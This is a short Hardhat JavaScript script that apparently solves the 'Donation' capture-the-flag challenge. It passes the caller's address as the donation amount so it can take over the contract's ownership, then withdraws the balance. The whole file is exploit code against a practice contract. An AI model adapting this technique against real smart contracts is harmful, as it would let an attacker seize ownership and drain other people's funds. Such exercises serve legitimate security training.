const { ethers } = require('hardhat');
const { BigNumber } = ethers;

const CHALLENGE_ADDRESS = '0xEa1b9CC981A00E97256E75a47B6cDFc0545805f3';
const ONE_ETHER = BigNumber.from(10).pow(18);

async function main() {
  const [owner] = await ethers.getSigners();

  const DonationChallenge = await ethers.getContractFactory('DonationChallenge');
  const contract = await DonationChallenge.attach(CHALLENGE_ADDRESS);

  const amount = BigNumber.from(owner.address);
  const wei = amount.div(ONE_ETHER).div(ONE_ETHER);
  console.log(`Sending ${ethers.utils.formatEther(wei)}`);

  await contract.donate(amount, { value: wei });
  await contract.withdraw();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
